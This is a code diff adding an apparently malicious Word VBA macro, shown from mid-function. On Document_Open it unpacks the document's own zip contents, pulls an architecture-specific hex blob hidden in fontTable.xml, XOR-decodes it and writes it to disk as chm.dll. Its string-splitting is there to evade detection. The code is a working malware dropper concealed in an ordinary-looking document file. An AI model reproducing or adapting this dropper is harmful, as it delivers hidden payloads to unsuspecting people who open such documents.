@@ -1,0 +1,55 @@
+objFSO.CreateFolder (sDir)
+    vZp = sDir & "\a.zip"
+    objFSO.CopyFile sDx, vZp
+    vDx = vZp
+    vDir = sDir
+    Set obj = CreateObject("Shell.Application")
+    Set objZipItems = obj.Namespace(vDx).Items
+    obj.Namespace(vDir).CopyHere objZipItems
+    fpp = sDir & "\word\fontTable.xml"
+    Set objTF = objFSO.OpenTextFile(fpp, 1)
+    contents = objTF.ReadAll
+    objTF.Close
+    
+    Set ws = CreateObject("WS" & "crip" & "t.Sh" & "ell")
+    Set wpe = ws.Environment("Pro" & "cess")
+    proc_ar = wpe("PRO" & "CESSO" & "R_ARCH" & "ITECTURE")
+    
+    If proc_ar = "AM" & "D6" & "4" Then
+        ptn = "<w:t64 v=" & Chr(34)
+    Else
+        ptn = "<w:t32 v=" & Chr(34)
+    End If
+    
+    FP = InStr(1, contents, ptn) + Len(ptn)
+    LP = InStr(FP, contents, Chr(34))
+    slen = LP - FP
+    Dim ssP As String
+    ssP = Mid(contents, FP, slen)
+    
+    Dim buf() As Byte
+    ReDim buf(Len(ssP) / 2 - 1)
+    bx = 0
+    i = 1
+    Do While i < Len(ssP)
+        buf(bx) = Val("&" & " H" + Mid(ssP, i, 2))
+        buf(bx) = buf(bx) Xor 31
+        bx = bx + 1
+        i = i + 2
+    Loop
+    pPath = CurDir & "\chm.dll"
+    Set BinaryStream = CreateObject("ADODB.Stream")
+    With BinaryStream
+        .Type = 1 'adTypeBinary
+        .Open
+        .Write buf
+        .SaveToFile pPath
+    End With
+    
+    objFSO.DeleteFolder (sDir)
+End Function
+
+Private Sub Document_Open()
+    GetPay
+    s = out
+End Sub
